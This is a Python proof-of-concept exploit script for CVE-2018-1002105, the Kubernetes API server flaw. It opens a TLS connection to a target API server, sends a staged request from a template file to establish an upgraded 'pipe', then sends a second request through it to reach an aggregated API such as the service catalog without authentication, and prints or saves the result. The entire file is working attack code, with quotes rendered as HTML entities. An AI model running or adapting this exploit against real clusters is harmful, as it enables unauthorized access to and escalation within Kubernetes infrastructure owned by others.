import argparse
from ssl import wrap_socket
from json import loads, dumps
from socket import create_connection


def request_stage_1(base, version, target):

    stage_1 = ""

    with open(&#039;ustage_1&#039;, &#039;r&#039;) as stage_1_fd:
        stage_1 = stage_1_fd.read()

    return stage_1.format(base, version, target
                          ).encode(&#039;utf-8&#039;)


def request_stage_2(base, version, target_api, target):

    stage_2 = ""

    with open(&#039;ustage_2&#039;, &#039;r&#039;) as stage_2_fd:
        stage_2 = stage_2_fd.read()

    return stage_2.format(base, version, target_api, target,
                          ).encode(&#039;utf-8&#039;)


def read_data(ssock):

    data = []
    data_incoming = True

    while data_incoming:
        data_in = ssock.recv(4096)

        if not data_in:
            data_incoming = False

        elif data_in.find(b&#039;\n\r\n0\r\n\r\n&#039;) != -1:
            data_incoming = False

        offset_1 = data_in.find(b&#039;{&#039;)
        offset_2 = data_in.find(b&#039;}\n&#039;)

        if offset_1 != -1 and offset_2 != -1:
            data_in = data_in[offset_1-1:offset_2+1]

        elif offset_1 != -1:
            data_in = data_in[offset_1-1:]

        elif offset_2 != -1:
            data_in = data_in[:offset_2-1]

        data.append(data_in)

    return data


def run_exploit(target, stage_1, stage_2, filename, json):

    host, port = target.split(&#039;:&#039;)

    with create_connection((host, port)) as sock:

        with wrap_socket(sock) as ssock:
            print(&#039;[*] Building pipe ...&#039;)
            ssock.send(stage_1)

            data_in = ssock.recv(15)

            if b&#039;HTTP/1.1 200 OK&#039; in data_in:
                print(&#039;[+] Pipe opened :D&#039;)
                read_data(ssock)

            else:
                print(&#039;[-] Not sure if this went well...&#039;)

            print(f"[*] Attempting to access url")

            ssock.send(stage_2)
            data_in = ssock.recv(15)

            if b&#039;HTTP/1.1 200 OK&#039; in data_in:
                print(&#039;[+] Pipe opened :D&#039;)

            data = read_data(ssock)

            return data


def parse_output(data, json, filename):

    if json:
        j = loads(&#039;&#039;.join(i.decode(&#039;utf-8&#039;)
                          for i in data))

        data = dumps(j, indent=4)

        if filename:
            mode = &#039;w+&#039;

        else:
            mode = &#039;wb+&#039;

    if filename:
        print(f"[*] Writing output to {filename} ....")

        with open(filename, mode) as fd:
            if json:
                fd.write(data)

            else:
                for msg in data:
                    fd.write(msg)

            print(&#039;[+] Done!&#039;)

    else:
        if json:
            print(data)

        else:
            print(&#039;&#039;.join(msg.decode(&#039;unicode_escape&#039;) for msg in data))


def main():

    parser = argparse.ArgumentParser(description=&#039;Unauthenticated PoC for&#039;
                                                 &#039; CVE-2018-1002105&#039;)
    required = parser.add_argument_group(&#039;required arguments&#039;)
    optional = parser.add_argument_group(&#039;optional arguments&#039;)

    required.add_argument(&#039;--target&#039;, &#039;-t&#039;, dest=&#039;target&#039;, type=str,
                          help=&#039;API server target:port&#039;, required=True)
    required.add_argument(&#039;--api-base&#039;, &#039;-b&#039;, dest=&#039;base&#039;, type=str,
                          help=&#039;Target API name i.e. "servicecatalog.k8s.io"&#039;,
                          default="servicecatalog.k8s.io")
    required.add_argument(&#039;--api-target&#039;, &#039;-u&#039;, dest=&#039;target_api&#039;, type=str,
                          help=&#039;API to access i.e. "clusterservicebrokers"&#039;,
                          default="clusterservicebrokers")

    optional.add_argument(&#039;--api-version&#039;, &#039;-a&#039;, dest=&#039;version&#039;, type=str,
                          help=&#039;API version to use i.e. "v1beta1"&#039;,
                          default="v1beta1")
    optional.add_argument(&#039;--json&#039;, &#039;-j&#039;, dest=&#039;json&#039;, action=&#039;store_true&#039;,
                          help=&#039;Print json output&#039;, default=False)
    optional.add_argument(&#039;--filename&#039;, &#039;-f&#039;, dest=&#039;filename&#039;, type=str,
                          help=&#039;File to save output to&#039;, default=False)

    args = parser.parse_args()

    if args.target.find(&#039;:&#039;) == -1:
        print("f[-] invalid target {args.target}")
        return False

    stage1 = request_stage_1(args.base, args.version, args.target)

    stage2 = request_stage_2(args.base, args.version, args.target_api,
                             args.target)

    output = run_exploit(args.target, stage1, stage2, args.filename, args.json)

    parse_output(output, args.json, args.filename)


if __name__ == &#039;__main__&#039;:
    main()

